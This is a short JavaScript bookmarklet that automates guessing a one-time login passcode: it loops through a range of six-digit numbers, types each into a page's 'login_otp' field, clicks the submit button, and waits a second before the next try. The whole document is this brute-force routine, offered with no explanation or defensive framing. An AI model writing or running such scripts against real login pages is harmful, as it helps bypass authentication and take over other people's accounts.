javascript: (() => {
  function delayFor(delay) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve();
    }, delay);
  });
}
async function abc()
{
console.log('dasda');
for(let i=888471;i<888482;i++)
{
b=document.querySelector("#div_otp_btn > button");a=document.querySelector("#login_otp");a.value=i;b.click();
await delayFor(1000);

}
}
abc();

})();


